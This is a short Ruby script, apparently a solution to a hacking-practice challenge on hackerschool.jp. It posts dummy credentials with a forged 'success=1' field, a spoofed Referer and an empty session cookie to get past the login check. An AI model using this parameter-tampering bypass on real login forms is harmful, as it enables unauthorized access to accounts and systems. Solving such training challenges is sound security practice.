#!/usr/bin/ruby
require 'net/http'
uri=URI.parse('http://www.hackerschool.jp/hack/take44.php')
Net::HTTP.start(uri.host){|http|
	resp=http.post(
		uri.path,
		'input_id=foo&pass=bar&success=1',
		{
			'Referer'=>uri.to_s,
			'Cookie'=>'PHPSESSID=',
		}
	)
	puts resp.body
}